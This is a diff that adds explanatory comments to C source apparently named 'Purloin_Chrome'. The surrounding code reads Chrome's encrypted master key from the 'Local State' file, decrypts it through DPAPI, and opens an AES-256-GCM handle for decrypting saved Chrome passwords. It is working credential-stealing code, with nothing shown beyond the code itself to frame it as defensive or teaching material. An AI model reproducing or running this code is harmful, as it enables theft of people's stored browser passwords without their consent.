@@ -1,5 +1,6 @@
 #include "includes/Purloin_Chrome.h"
 
+// Gets the Master Key of Chrome, which is inside "%LOCALAPPDATA%\Google\Chrome\User Data\Local State" and store it in [PWCHAR] enc_master_key
 BOOL get_encrypted_masterkey(PCWSTR browser_dir, PCWSTR data_file, PWCHAR enc_master_key, WORD enc_master_key_size, PSTR buf_outMsg, WORD buf_outSize) {
 	FILE* fp_local_state_file = NULL;												// File pointer to 'Local State' file
 	WCHAR local_state_location[MAX_PATH], buffer[2];								// First Buffer to hold path for 'Local State' file, and the second buffer to hold two wchars (including null-term). Buffer is used to read file
@@ -74,6 +75,7 @@ BOOL get_encrypted_masterkey(PCWSTR browser_dir, PCWSTR data_file, PWCHAR enc_ma
 	return FALSE;
 }
 
+// Decrypt the obtained master key. Decrypted byte form is stored on the [DATA_BLOB] blob_dec_masterkey 
 BOOL decrypt_masterkey(PWCHAR enc_master_key, PCHAR char_master_key, WORD enc_char_master_key_size, DATA_BLOB* blob_dec_masterkey, PSTR buf_outMsg, WORD buf_outSize) {
 	/*
 		Master key in the 'Local State' file is encoded in Base64, after decoding it into byte form, there will be 5 bytes of 'DPAPI' string to identify
@@ -109,6 +111,7 @@ BOOL decrypt_masterkey(PWCHAR enc_master_key, PCHAR char_master_key, WORD enc_ch
 	return TRUE;
 }
 
+// Use the decrypted master key to get a handle to the AES-GCM 256 decryption algorithm
 BOOL get_decryption_handler(BCRYPT_KEY_HANDLE* p_handle_key, DATA_BLOB* blob_dec_masterkey, PSTR buf_outMsg, WORD buf_outSize) {
 	/*
 		Chrome passwords are encrypted using AES-256-GCM encrypting algorithm (symetric). So Decrypting algorithm provider is opened and the returned resulting handle to actully
